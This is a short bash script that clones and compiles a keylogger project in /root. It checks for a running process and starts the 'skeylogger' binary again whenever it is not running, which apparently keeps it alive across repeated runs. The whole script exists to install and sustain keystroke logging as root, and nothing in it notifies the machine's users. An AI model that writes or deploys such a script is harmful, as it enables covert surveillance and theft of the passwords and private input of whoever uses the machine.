#!/bin/bash

if [ -d "/root/simple-key-logger" ] 
	then
    		:
	else
		cd /root/
		git clone https://github.com/gsingh93/simple-key-logger.git
		cd /root/simple-key-logger/
		make
fi

result=`ps aux | grep -i "skeylogger" | grep -v "grep" | wc -l`
if [ $result -ge 1 ]
   then
        :
   else
	cd /root/simple-key-logger/
	./skeylogger
fi
